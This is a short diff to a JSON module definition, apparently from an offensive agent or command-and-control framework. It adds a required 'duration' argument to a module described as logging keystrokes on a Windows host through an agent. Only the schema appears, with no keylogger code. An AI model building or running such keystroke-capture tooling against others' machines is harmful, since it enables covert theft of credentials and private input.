@@ -74,10 +74,12 @@
         "asynckeystate.logger":{
                 "description":"log keystrokes on the local windows host",
                 "arguments":{
-                        "acid":"agent to run wmi method"
+                        "acid":"agent to run wmi method",
+			"duration":"how long to run the keylogger (in seconds)"
                 },
                 "required":[
-                        "acid"
+                        "acid",
+			"duration"
                 ]
         }
 
